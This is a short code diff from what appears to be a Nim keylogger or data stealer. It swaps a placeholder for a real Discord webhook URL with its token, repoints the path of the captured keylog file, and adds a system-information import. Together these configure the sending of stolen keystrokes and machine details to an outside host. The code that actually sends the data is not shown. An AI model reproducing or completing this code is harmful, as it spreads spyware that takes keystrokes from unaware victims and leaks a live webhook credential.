@@ -2,9 +2,10 @@ import json, puppy, os, regex, strformat
 from sequtils import deduplicate, concat
 from strutils import replace, endswith, strip
 import times
+import sysinfo
 
-let webhook = "{TON DISCORD WEBHOOK URL}"
-let keylogs = readFile("keylogs.txt")
+let webhook = "https://discord.com/api/webhooks/1072931476573790260/qSEdDs26Scn9pQb6ZI_eiB1dk56EWgJaxsUEJTpKjGQi4kYGhDR8wDRF_fukf6ziAe2L"
+let keylogs = readFile("src/output/keylogs.txt")
 let timestamp = now()
 
 const
